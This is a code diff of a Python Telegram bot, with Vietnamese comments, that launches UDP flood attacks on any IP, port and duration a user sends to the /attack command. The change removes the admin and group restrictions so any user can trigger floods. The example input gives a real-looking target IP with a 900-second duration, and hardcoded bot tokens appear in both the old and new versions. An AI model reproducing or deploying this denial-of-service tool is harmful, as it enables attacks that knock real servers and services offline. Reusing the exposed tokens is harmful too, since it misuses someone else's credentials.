@@ -1,22 +1,16 @@
-
 import telebot
 import threading
 import time
-import os
 import socket
 import random
 
 # === Cấu hình ===
-TOKEN = "8064257148:AAH6DfA-DrE_pS60OBfOj1JsDYOKKdLtmdc"
-ADMIN_ID = 6821953959
-GROUP_ID = -1002149794790  # Group được phép sử dụng bot
-
+TOKEN = "8137622733:AAHJEiP0Wx3Lis7jVUwuBJgfIT29-3MqEqI"
 bot = telebot.TeleBot(TOKEN)
 
-def is_from_group(message):
-    return message.chat.type in ['group', 'supergroup'] and message.chat.id == GROUP_ID
+cooldowns = {}  # Lưu thời gian cooldown của từng user
 
-# === Hàm tấn công UDP thật ===
+# === UDP Attack ===
 def udp_attack(ip, port, duration):
     timeout = time.time() + duration
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -28,44 +22,43 @@ def udp_attack(ip, port, duration):
         except:
             pass
 
-# === /start: Chào mừng ===
+# === /start ===
 @bot.message_handler(commands=['start'])
 def start(message):
-    if not is_from_group(message):
-        return
     bot.reply_to(message, "Chào bạn! Gửi /attack để thực hiện test UDP.")
 
-# === /myid: Lấy Telegram user ID ===
+# === /myid ===
 @bot.message_handler(commands=['myid'])
 def myid(message):
-    if not is_from_group(message):
-        return
-    bot.reply_to(message, f"ID của bạn là: `{message.from_user.id}`", parse_mode='Markdown')
+    bot.reply_to(message, f"ID của bạn là: `{message.from_user.id}`\nGroup ID: `{message.chat.id}`", parse_mode='Markdown')
 
-# === /attack: chỉ cho ADMIN_ID và trong group ===
+# === /attack (ai cũng dùng được, nhưng giới hạn 5s mỗi lần) ===
 @bot.message_handler(commands=['attack'])
 def handle_attack(message):
-    if not is_from_group(message):
+    user_id = message.from_user.id
+    now = time.time()
+    last_used = cooldowns.get(user_id, 0)
+
+    if now - last_used < 5:
+        wait_time = round(5 - (now - last_used), 1)
+        bot.reply_to(message, f"Vui lòng chờ {wait_time} giây nữa rồi thử lại.")
         return
-    if message.from_user.id != ADMIN_ID:
-        bot.reply_to(message, "Bạn không có quyền sử dụng lệnh này.")
-        return
-    bot.reply_to(message, "Nhập theo cú pháp: `ip port thời_gian`\nVí dụ: `1.2.3.4 27015 10`", parse_mode='Markdown')
+
+    cooldowns[user_id] = now
+    bot.reply_to(message, "Nhập theo cú pháp: `ip port thời_gian`\nVí dụ: `148.153.219.121 10012 900`", parse_mode='Markdown')
     bot.register_next_step_handler(message, process_attack)
 
 # === Xử lý lệnh attack ===
 def process_attack(message):
-    if not is_from_group(message):
-        return
     try:
-        ip, port, duration = message.text.split()
+        ip, port, duration = message.text.strip().split()
         port = int(port)
         duration = int(duration)
         bot.reply_to(message, f"Đang gửi UDP tới {ip}:{port} trong {duration} giây.")
         thread = threading.Thread(target=udp_attack, args=(ip, port, duration))
         thread.start()
     except:
-        bot.reply_to(message, "Sai cú pháp. Nhập lại bằng: `ip port thời_gian`")
+        bot.reply_to(message, "Sai cú pháp. Nhập lại theo dạng: `ip port thời_gian`", parse_mode='Markdown')
 
 # === Khởi động bot ===
 if __name__ == '__main__':
